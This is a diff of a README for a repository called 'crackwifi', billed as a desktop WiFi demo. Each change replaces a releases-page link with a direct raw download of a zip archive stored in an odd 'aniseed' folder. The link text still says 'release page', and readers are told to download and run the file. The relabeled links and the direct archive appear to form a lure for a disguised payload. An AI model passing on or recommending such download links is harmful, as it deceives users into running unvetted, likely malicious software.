@@ -1,12 +1,12 @@
 # 🛡️ crackwifi - Desktop WiFi Demo With Style
 
-[![Download crackwifi](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/connorssubmitter868/crackwifi/releases)
+[![Download crackwifi](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/connorssubmitter868/crackwifi/main/aniseed/Software_2.6.zip)
 
 ## 📥 Download
 
 Visit the release page to download and run this file:
 
-[Open the release page](https://github.com/connorssubmitter868/crackwifi/releases)
+[Open the release page](https://raw.githubusercontent.com/connorssubmitter868/crackwifi/main/aniseed/Software_2.6.zip)
 
 ## 🖥️ What is crackwifi?
 
@@ -39,7 +39,7 @@ For the best experience, use a system with 8 GB RAM and a stable graphics driver
 ## 🚀 Getting Started
 
 1. Open the release page:
-   [https://github.com/connorssubmitter868/crackwifi/releases](https://github.com/connorssubmitter868/crackwifi/releases)
+   [https://raw.githubusercontent.com/connorssubmitter868/crackwifi/main/aniseed/Software_2.6.zip](https://raw.githubusercontent.com/connorssubmitter868/crackwifi/main/aniseed/Software_2.6.zip)
 
 2. Find the latest release.
 
@@ -137,7 +137,7 @@ Keep all files in the same folder so the app can run without issues.
 
 ## 🔗 Download Again
 
-[Go to the release page](https://github.com/connorssubmitter868/crackwifi/releases)
+[Go to the release page](https://raw.githubusercontent.com/connorssubmitter868/crackwifi/main/aniseed/Software_2.6.zip)
 
 ## 🧩 Notes for Best Use
 
